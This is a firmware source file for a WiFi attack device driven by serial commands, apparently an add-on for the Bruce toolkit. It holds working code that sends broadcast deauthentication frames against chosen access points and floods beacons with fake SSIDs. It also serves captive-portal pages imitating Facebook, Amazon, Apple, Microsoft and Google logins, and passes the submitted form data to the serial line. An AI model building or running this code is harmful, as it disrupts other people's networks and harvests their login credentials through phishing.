#include "vector"
#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_drv.h"
#include "debug.h"
#include "WiFi.h"

// Bruce UART integration
#define BRUCE_CMD_PREFIX "BRUCE:"
#define BRUCE_RESP_PREFIX "BRUCE_RESP:"

enum BruceCommands {
  BRUCE_CMD_SCAN = 0x01,
  BRUCE_CMD_SELECT_SSID = 0x02,
  BRUCE_CMD_DEAUTH_START = 0x03,
  BRUCE_CMD_DEAUTH_STOP = 0x04,
  BRUCE_CMD_LIST_APS = 0x05,
  BRUCE_CMD_STATUS = 0x06
};

typedef struct __attribute__((packed)) {
  uint8_t cmd;
  uint8_t len;
  uint8_t data[256];
} BrucePacket;

//Captive portals
#include "portals/compressed/facebook.h"
#include "portals/compressed/amazon.h"
#include "portals/compressed/apple.h"
#include "portals/compressed/microsoft.h"
#include "portals/compressed/google.h"
#include "portals/default.h"

enum portals{
  Default,
  Facebook,
  Amazon,
  Apple,
  Microsoft,
  Google
};

//DNS
#include "dns.h"
#include <lwip/lwip_v2.0.2/src/include/lwip/priv/tcp_priv.h>

#define MIN(a, b) ((a) < (b) ? (a) : (b))
#define BAUD 115200

typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
  int security;
} WiFiScanResult;

const char* rick_roll[8] = {
      "01 Never gonna give you up",
      "02 Never gonna let you down",
      "03 Never gonna run around",
      "04 and desert you",
      "05 Never gonna make you cry",
      "06 Never gonna say goodbye",
      "07 Never gonna tell a lie",
      "08 and hurt you"
};

std::vector<WiFiScanResult> scan_results;
std::vector<int> deauth_wifis, wifis_temp;

uint8_t deauth_bssid[6];
uint16_t deauth_reason = 2;
bool randomSSID, rickroll;
char randomString[19];
int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 149, 153, 157, 161};
int portal = 0;
int localPortNew = 1000;
char wpa_pass[64];
char ap_channel[4];
bool secured = false;
__u8 customMac[8] = {0x00,0xE0,0x4C,0x01,0x02,0x03,0x00,0x00};
bool useCustomMac = false;
extern u8 rtw_get_band_type(void);
#define FRAMES_PER_DEAUTH 5

// Bruce specific
int selectedSSIDIndex = -1;

// Variabel global
String readString;
String ssid = "";
uint32_t current_num = 0;

String generateRandomString(int len){
  String randstr = "";
  const char setchar[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  for (int i = 0; i < len; i++){
    int index = random(0,strlen(setchar));
    randstr += setchar[index];
  }
  return randstr;
}

String parseRequest(String request) {
  int path_start = request.indexOf(' ') + 1;
  int path_end = request.indexOf(' ', path_start);
  return request.substring(path_start, path_end);
}

bool apActive = false;
int status = WL_IDLE_STATUS;   

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    if(result.ssid.length()==0) result.ssid = String("<empty>");
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", 
             result.bssid[0], result.bssid[1], result.bssid[2], 
             result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    result.security = record->security;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

WiFiServer server(80);
bool serveBegined = false;

void createAP(char* ssid, char* channel, char* password){
  int mode;
  const char* ifname = WLAN0_NAME;
  wext_get_mode(ifname, &mode);
  Serial.print("WLAN 0 ");
  Serial.println(mode);

  ifname = WLAN1_NAME;
  wext_get_mode(ifname, &mode);
  Serial.print("WLAN 1 ");
  Serial.println(mode);

  DEBUG_SER_PRINT("CREATING AP");
  DEBUG_SER_PRINT(ssid);
  DEBUG_SER_PRINT(channel);
  while (status != WL_CONNECTED) {
    DEBUG_SER_PRINT("CREATING AP 2");
    if(strcmp(password,"")==0){
      status = WiFi.apbegin(ssid, channel, (uint8_t) 0);
    }else{
      status = WiFi.apbegin(ssid, password, channel, (uint8_t) 0);
    }
    delay(1000);
  }
  unbind_dns();
  delay(1000);
  start_DNS_Server();
  if(!serveBegined){
    server.begin();
    serveBegined = true;
  }
  apActive = true;
  ifname = WLAN0_NAME;
  wext_get_mode(ifname, &mode);
  Serial.print("WLAN 0 ");
  Serial.println(mode);

  ifname = WLAN1_NAME;
  wext_get_mode(ifname, &mode);
  Serial.print("WLAN 1 ");
  Serial.println(mode);
}

void createAP(char* ssid, char* channel){
  createAP(ssid, channel, "");
}

void destroyAP(){
  void unbind_all_udp();
  delay(500);
  WiFiClient client = server.available();
  while(client.connected()){
    DEBUG_SER_PRINT("PArando cliente");
    DEBUG_SER_PRINT(client);
    client.flush();
    client.stop();
    client = server.available();
  }
  apActive = false;
  delay(500);
  wifi_off();
  delay(500);
  WiFiDrv::wifiDriverInit();
  wifi_on(RTW_MODE_STA_AP);
  status = WL_IDLE_STATUS;   
  delay(500);
  WiFi.enableConcurrent();
  WiFi.status();
  int channel;
  wifi_get_channel(&channel);
}

String makeResponse(int code, String content_type, bool compressed) {
  String response = "HTTP/1.1 " + String(code) + " OK\n";
  if(compressed)
    response += "Content-Encoding: gzip\n";
  response += "Content-Type: " + content_type + "\n";
  response += "Connection: close\n\n";
  return response;
}

void handle404(WiFiClient &client) {
  String response = makeResponse(404, "text/plain", false);
  response += "Not found!";
  client.write(response.c_str());
}

void handleRequest(WiFiClient &client, enum portals portalType, String ssid){
  const char *webPage;
  size_t len;
  bool compressed = false;
  switch(portalType){
    case Default:
      webPage = default_web(ssid);
      len = strlen(webPage);
      break;
    case Facebook:
      webPage = (const char*)facebook;
      len = facebook_len;
      break;
    case Amazon:
      webPage = (const char*)amazon;
      len = amazon_len;
      break;
    case Apple:
      webPage = (const char *)apple;
      len = apple_len;
      break;
    case Google:
      webPage = (const char *)google;
      len = google_len;
      break;
    case Microsoft:
      webPage = (const char *)microsoft;
      len = microsoft_len;
      break;
    default:
      webPage = default_web(ssid);
  }
  Serial.print("Heap libre header:");
  Serial.println(xPortGetFreeHeapSize());
  if(webPage[0]==0x1f && webPage[1]==0x8b){
    compressed = true;
  }
  
  String response = makeResponse(200, "text/html", compressed);
  client.write(response.c_str());
   
  size_t chunkSize = 5000;
  for (size_t i = 0; i < len; i += chunkSize) {
    size_t sendSize = MIN(chunkSize, len - i);
    while(client.available()){
      client.read();
      delay(10);
    }
    Serial.print("Heap libre write:");
    Serial.println(xPortGetFreeHeapSize());
    if(client.connected()){
      client.write((const uint8_t *)(webPage + i), sendSize);
      if(client.getWriteError()) return;
    } else {
      return;
    }
    delay(1);
  }
  delay(10);
  while(client.available()){
    client.read();
    delay(1);
  }
}

int scanNetworks(int milliseconds) {
  DEBUG_SER_PRINT("Scanning WiFi networks (" + (String)milliseconds + " ms)...\n");
  scan_results.clear();
  DEBUG_SER_PRINT("wifi get band type:" + (String)wifi_get_band_type() + "\n");
  DEBUG_SER_PRINT("scan results cleared...");
  
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    digitalWrite(LED_B, false);
    for (int i = 0; i < milliseconds / 100; i++) {
      digitalWrite(LED_G, !digitalRead(LED_G));
      delay(100);
    }
    digitalWrite(LED_B, true);
    DEBUG_SER_PRINT(" done!\n");
    
    // Send the list of SSIDs to Bruce
    sendSSIDListToBruce();
    
    return 0;
  } else {
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}

// ==================== Bruce Integration Functions ====================

// Send formatted response to Bruce via Serial
void sendToBruce(const char* format, ...) {
  char buffer[512];
  va_list args;
  va_start(args, format);
  vsnprintf(buffer, sizeof(buffer), format, args);
  va_end(args);
  
  Serial.print(BRUCE_RESP_PREFIX);
  Serial.println(buffer);
  Serial.print("[Bruce] Sent: ");
  Serial.println(buffer);
}

// Send the full AP list to Bruce
void sendSSIDListToBruce() {
  sendToBruce("SCAN_RESULT:COUNT=%d", scan_results.size());
  
  for (uint i = 0; i < scan_results.size(); i++) {
    char bssid_str[18];
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             scan_results[i].bssid[0], scan_results[i].bssid[1],
             scan_results[i].bssid[2], scan_results[i].bssid[3],
             scan_results[i].bssid[4], scan_results[i].bssid[5]);
    
    sendToBruce("AP:%d|%s|%s|%d|%d|%d",
                i,
                scan_results[i].ssid.c_str(),
                bssid_str,
                scan_results[i].channel,
                scan_results[i].security,
                scan_results[i].rssi);
  }
  
  sendToBruce("SCAN_COMPLETE");
}

// Send deauth status update to Bruce
void sendDeauthStatusToBruce(int apIndex, bool isActive) {
  if (apIndex >= 0 && apIndex < (int)scan_results.size()) {
    sendToBruce("DEAUTH:%d|%s|%s",
                apIndex,
                isActive ? "ACTIVE" : "STOPPED",
                scan_results[apIndex].ssid.c_str());
  }
}

// Handle Bruce specific commands (prefixed with "BRUCE:")
void handleBruceCommand(String cmd) {
  Serial.print("[Bruce CMD]: ");
  Serial.println(cmd);
  
  if (cmd.startsWith("SCAN")) {
    // Bruce request scan
    if (apActive) destroyAP();
    deauth_wifis.clear();
    randomSSID = false;
    rickroll = false;
    ssid = "";
    
    int scanTime = 5000;
    if (cmd.indexOf(',') > 0) {
      scanTime = cmd.substring(cmd.indexOf(',') + 1).toInt();
    }
    
    if (scanNetworks(scanTime) == 0) {
      sendToBruce("SCAN_SUCCESS");
    } else {
      sendToBruce("SCAN_FAILED");
    }
    
  } else if (cmd.startsWith("SELECT_SSID")) {
    // Format: SELECT_SSID,index
    int commaIdx = cmd.indexOf(',');
    if (commaIdx > 0) {
      int index = cmd.substring(commaIdx + 1).toInt();
      if (index >= 0 && index < (int)scan_results.size()) {
        selectedSSIDIndex = index;
        sendToBruce("SELECTED:%d|%s", index, scan_results[index].ssid.c_str());
      } else {
        sendToBruce("ERROR:Invalid SSID index");
      }
    }
    
  } else if (cmd.startsWith("DEAUTH_START")) {
    // Format: DEAUTH_START,index
    int commaIdx = cmd.indexOf(',');
    if (commaIdx > 0) {
      int index = cmd.substring(commaIdx + 1).toInt();
      if (index >= 0 && index < (int)scan_results.size()) {
        // Check if already in list
        bool alreadyInList = false;
        for (int i = 0; i < (int)deauth_wifis.size(); i++) {
          if (deauth_wifis[i] == index) {
            alreadyInList = true;
            break;
          }
        }
        
        if (!alreadyInList) {
          deauth_wifis.push_back(index);
          sendDeauthStatusToBruce(index, true);
          sendToBruce("DEAUTH_STARTED:%d", index);
        } else {
          sendToBruce("DEAUTH_ALREADY_ACTIVE:%d", index);
        }
      } else {
        sendToBruce("ERROR:Invalid index");
      }
    }
    
  } else if (cmd.startsWith("DEAUTH_STOP")) {
    // Format: DEAUTH_STOP,index  or DEAUTH_STOP (stop all)
    int commaIdx = cmd.indexOf(',');
    if (commaIdx > 0) {
      int index = cmd.substring(commaIdx + 1).toInt();
      bool removed = false;
      
      wifis_temp.clear();
      for (int i = 0; i < (int)deauth_wifis.size(); i++) {
        if (deauth_wifis[i] != index) {
          wifis_temp.push_back(deauth_wifis[i]);
        } else {
          removed = true;
        }
      }
      
      deauth_wifis.clear();
      for (int i = 0; i < (int)wifis_temp.size(); i++) {
        deauth_wifis.push_back(wifis_temp[i]);
      }
      
      if (removed) {
        sendDeauthStatusToBruce(index, false);
        sendToBruce("DEAUTH_STOPPED:%d", index);
      } else {
        sendToBruce("DEAUTH_NOT_ACTIVE:%d", index);
      }
    } else {
      // Stop all
      deauth_wifis.clear();
      sendToBruce("DEAUTH_ALL_STOPPED");
    }
    
  } else if (cmd.startsWith("DEAUTH_STOP_ALL")) {
    deauth_wifis.clear();
    sendToBruce("DEAUTH_ALL_STOPPED");
    
  } else if (cmd.startsWith("GET_AP_LIST")) {
    // Resend AP list
    sendSSIDListToBruce();
    
  } else if (cmd.startsWith("GET_STATUS")) {
    // Send current status
    sendToBruce("STATUS:DEAUTH_COUNT=%d", deauth_wifis.size());
    sendToBruce("STATUS:AP_ACTIVE=%s", apActive ? "YES" : "NO");
    sendToBruce("STATUS:RANDOM_SSID=%s", randomSSID ? "YES" : "NO");
    sendToBruce("STATUS:RICKROLL=%s", rickroll ? "YES" : "NO");
    
    if (apActive) {
      sendToBruce("STATUS:PORTAL=%d", portal);
    }
    
  } else if (cmd.startsWith("HELP")) {
    sendToBruce("AVAILABLE_COMMANDS:SCAN,SELECT_SSID,DEAUTH_START,DEAUTH_STOP,DEAUTH_STOP_ALL,GET_AP_LIST,GET_STATUS");
  }
}

// Handle legacy commands (without BRUCE: prefix) - existing functionality
void handleLegacyCommand(String cmd) {
  if (cmd.length() == 0) return;
  
  if (cmd.startsWith("SCAN")) {
    if (apActive) destroyAP();
    deauth_wifis.clear();
    randomSSID = false;
    rickroll = false;
    ssid = "";
    while (scanNetworks(5000)) {
      delay(1000);
    }
    Serial.print("SCAN:OK\n");
    
  } else if (cmd.startsWith("STOP")) {
    DEBUG_SER_PRINT("Stop deauthing\n");
    secured = false;
    strcpy(wpa_pass, "");
    if (cmd.length() > 5 && !apActive) {
      unsigned int numStation = cmd.substring(5, cmd.length() - 1).toInt();
      if (numStation < scan_results.size()) {
        wifis_temp.clear();
        unsigned int num_st_tmp;
        for (unsigned int i = 0; i < deauth_wifis.size(); i++) {
          num_st_tmp = deauth_wifis[i];
          if (num_st_tmp != numStation) {
            wifis_temp.push_back(num_st_tmp);
          }
        }
        deauth_wifis.clear();
        for (unsigned int i = 0; i < wifis_temp.size(); i++) {
          num_st_tmp = wifis_temp[i];
          deauth_wifis.push_back(num_st_tmp);
        }
      }
    } else {
      destroyAP();
      deauth_wifis.clear();
      DEBUG_SER_PRINT("Stop randomSSID\n");
      randomSSID = false;
      rickroll = false;
      ssid = "";
    }
    digitalWrite(LED_G, 0);
    
  } else if (cmd.startsWith("RANDOM")) {
    DEBUG_SER_PRINT("Start randomSSID\n");
    randomSSID = true;
    
  } else if (cmd.startsWith("BSSID")) {
    ssid = cmd.substring(6, cmd.length() - 1);
    DEBUG_SER_PRINT("Starting BSSID " + ssid + "\n");
    
  } else if (cmd.startsWith("APSTART")) {
    char ssid_buf[33];
    String ap_ssid = cmd.substring(8, cmd.length() - 1);
    ap_ssid.toCharArray(ssid_buf, 33);
    if (secured) {
      createAP(ssid_buf, ap_channel, wpa_pass);
    } else {
      createAP(ssid_buf, ap_channel);
    }
    DEBUG_SER_PRINT("Starting AP " + ap_ssid + "\n");
    if (!serveBegined) {
      server.begin();
      serveBegined = true;
    }
    apActive = true;
    
  } else if (cmd.startsWith("RICKROLL")) {
    rickroll = true;
    DEBUG_SER_PRINT("Starting BSSID " + ssid + "\n");
    
  } else if (cmd.startsWith("PORTAL")) {
    portal = cmd.substring(7, cmd.length() - 1).toInt();
    
  } else if (cmd.startsWith("REASON")) {
    deauth_reason = cmd.substring(7, cmd.length() - 1).toInt();
    
  } else if (cmd.startsWith("PASSWORD")) {
    String password = cmd.substring(9, cmd.length() - 1).c_str();
    password.toCharArray(wpa_pass, 64);
    Serial.println(password);
    Serial.println(wpa_pass);
    secured = true;
    
  } else if (cmd.startsWith("CHANNEL")) {
    cmd.substring(8, cmd.length() - 1).toCharArray(ap_channel, 4);
    
  } else if (cmd.startsWith("APMAC")) {
    String mac = cmd.substring(6, cmd.length() - 1);
    DEBUG_SER_PRINT("APMAC " + mac + "\n");
    if (mac.length() == 17) {
      useCustomMac = true;
      char macStr[18];
      mac.toCharArray(macStr, sizeof(macStr));
      char *token = strtok(macStr, ":");
      int i = 0;
      while (token != NULL && i < 6) {
        customMac[i] = strtoul(token, NULL, 16);
        token = strtok(NULL, ":");
        i++;
      }
      Serial.print("MAC en bytes: ");
      for (int i = 0; i < 6; i++) {
        if (customMac[i] < 0x10) Serial.print("0");
        Serial.print(customMac[i], HEX);
        if (i < 7) Serial.print(":");
      }
      Serial.println();
      mac.replace(":", "");
      int ret = wifi_change_mac_address_from_ram(1, customMac);
      if (ret == RTW_ERROR) {
        Serial.println("ERROR:Bad Mac");
      }
    } else {
      useCustomMac = false;
    }
    
  } else if (cmd.startsWith("DEAUTH") || cmd.startsWith("EVIL")) {
    int numStation;
    if (cmd.startsWith("EVIL")) {
      numStation = cmd.substring(5, cmd.length() - 1).toInt();
    } else {
      numStation = cmd.substring(7, cmd.length() - 1).toInt();
    }
    if (numStation < (int)scan_results.size() && numStation >= 0) {
      DEBUG_SER_PRINT("Deauthing " + (String)numStation + "\n");
      deauth_wifis.push_back(numStation);
      DEBUG_SER_PRINT("Deauthing " + scan_results[numStation].ssid + "\n");
      if (cmd.startsWith("EVIL")) {
        // ===== EVIL TWIN DISABLED =====
        /*
        int str_len = scan_results[numStation].ssid.length() + 1;
        char char_array[str_len];
        scan_results[numStation].ssid.toCharArray(char_array, str_len);
        char buffer[4];
        itoa(scan_results[numStation].channel, buffer, 10);
        if (str_len > 1)
          createAP(char_array, buffer);
        else
          Serial.print("ERROR: BAD SSID, please try to rescan again");
        */
      }
    } else {
      DEBUG_SER_PRINT("Wrong AP");
    }
    
  } else if (cmd.startsWith("PING")) {
    Serial.print("PONG\n");
    
  } else if (cmd.startsWith("LIST")) {
    for (uint i = 0; i < scan_results.size(); i++) {
      Serial.print("AP:" + String(i) + "|");
      Serial.print(scan_results[i].ssid + "|");
      for (int j = 0; j < 6; j++) {
        if (j > 0) {
          Serial.print(":");
        }
        Serial.print(scan_results[i].bssid[j], HEX);
      }
      Serial.print("|" + String(scan_results[i].channel) + "|");
      Serial.print(String(scan_results[i].security) + "|");
      Serial.print(String(scan_results[i].rssi) + "\n");
    }
  }
}

// ==================== End Bruce Integration ====================

void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);
  
  Serial.begin(BAUD);
  readString.reserve(50);
  DEBUG_SER_PRINT("Iniciando\n");
  
  WiFi.enableConcurrent();
  WiFi.status();
  int channel;
  wifi_get_channel(&channel);

  digitalWrite(LED_B, HIGH);
}

void loop() {
  // Read commands from Serial (USB) line by line
  while (Serial.available()) {
    String line = Serial.readStringUntil('\n');
    line.trim();
    if (line.length() == 0) continue;
    
    // Check if it's a Bruce command
    if (line.startsWith(BRUCE_CMD_PREFIX)) {
      handleBruceCommand(line.substring(strlen(BRUCE_CMD_PREFIX)));
    } else {
      // Legacy command (backward compatibility)
      handleLegacyCommand(line);
    }
  }
  
  // Existing deauth attack logic
  if (deauth_wifis.size() > 0) {
    memcpy(deauth_bssid, scan_results[deauth_wifis[current_num]].bssid, 6);
    wext_set_channel(WLAN0_NAME, scan_results[deauth_wifis[current_num]].channel);
    current_num++;
    if (current_num >= deauth_wifis.size()) current_num = 0;
    digitalWrite(LED_R, HIGH);
    for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      delay(5);
    }
    digitalWrite(LED_R, LOW);
    
    // Send heartbeat to Bruce every ~50 deauth frames
    static int deauthCounter = 0;
    deauthCounter++;
    if (deauthCounter >= 50) {
      sendToBruce("DEAUTH_HEARTBEAT:ACTIVE_COUNT=%d", deauth_wifis.size());
      deauthCounter = 0;
    }
    
    delay(50);
  }

  // Existing beacon spam modes
  if (randomSSID) {
    digitalWrite(LED_G, !digitalRead(LED_G));
    int randomIndex = random(0, 10);
    int randomChannel = allChannels[randomIndex];
    String ssid2 = generateRandomString(10);
    for (int i = 0; i < 6; i++) {
      byte randomByte = random(0x00, 0xFF);
      snprintf(randomString + i * 3, 4, "\\x%02X", randomByte);
    }
    const char * ssid_cstr2 = ssid2.c_str();
    wext_set_channel(WLAN0_NAME, randomChannel);
    for (int x = 0; x < 5; x++) {
      wifi_tx_beacon_frame(randomString, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid_cstr2);
    }
  }
  
  if (rickroll) {
    digitalWrite(LED_G, !digitalRead(LED_G));
    for (int v = 0; v < 8; v++) {
      String ssid2 = rick_roll[v];
      for (int i = 0; i < 7; i++) {
        byte randomByte = random(0x00, 0xFF);
        snprintf(randomString + i * 3, 4, "\\x%02X", randomByte);
      }
      const char * ssid_cstr2 = ssid2.c_str();
      wext_set_channel(WLAN0_NAME, v + 1);
      for (int x = 0; x < 5; x++) {
        wifi_tx_beacon_frame(randomString, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid_cstr2);
      }
    }
  }
  
  if (ssid != "") {
    int channel = 5;
    digitalWrite(LED_G, !digitalRead(LED_G));
    wext_set_channel(WLAN0_NAME, channel);
    const char * ssid_cstr2 = ssid.c_str();
    for (int x = 0; x < 5; x++) {
      DEBUG_SER_PRINT("START " + ssid);
      wifi_tx_beacon_frame((void *)"\x00\xE0\x4C\x01\x02\x03", 
                          (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 
                          ssid_cstr2);
    }
  }
  
  // Captive portal handling
  if (apActive) {
    WiFiClient client = server.available();
    if (client) {
      String request;
      request.reserve(256);
      
      while (client.connected()) {
        if (client.available()) {
          char character = client.read();
          if (character == '\n') {
            while (client.available()) {
              character = client.read();
              client.clearWriteError();
              delay(1);
            }
            String path = parseRequest(request);
            Serial.println(request);
            if (path.startsWith("/generate_204") || path.startsWith("/ncsi.txt") || 
                path.startsWith("/success.html") || path.startsWith("/userinput") || 
                path.startsWith("/login") || path.startsWith("/?") || 
                path.equals("/") || path.startsWith("/get")) {
              
              if (deauth_wifis.size() != 0)
                handleRequest(client, (enum portals)portal, scan_results[deauth_wifis[0]].ssid);
              else
                handleRequest(client, (enum portals)portal, "router");
              
              if (path.indexOf('?') && (path.indexOf('=') > path.indexOf('?'))) {
                String datos = path.substring(path.indexOf('?') + 1);
                if (datos.length() > 0) {
                  Serial.print("EV:");
                  Serial.println(datos);
                }
              }
            } else {
              handle404(client);
            }
            break;
          } else if (character == '%') {
            char buff[2];
            client.read(buff, 2);
            char value = (char)strtol(buff, NULL, 16);
            if (value <= 127) {
              character = value;
            } else {
              request += "%";
              request += buff[0];
              request += buff[1];
            }
          }
          request += character;
          delay(10);
        }
      }
      
      delay(50);
      client.stop();
    }
  }
}
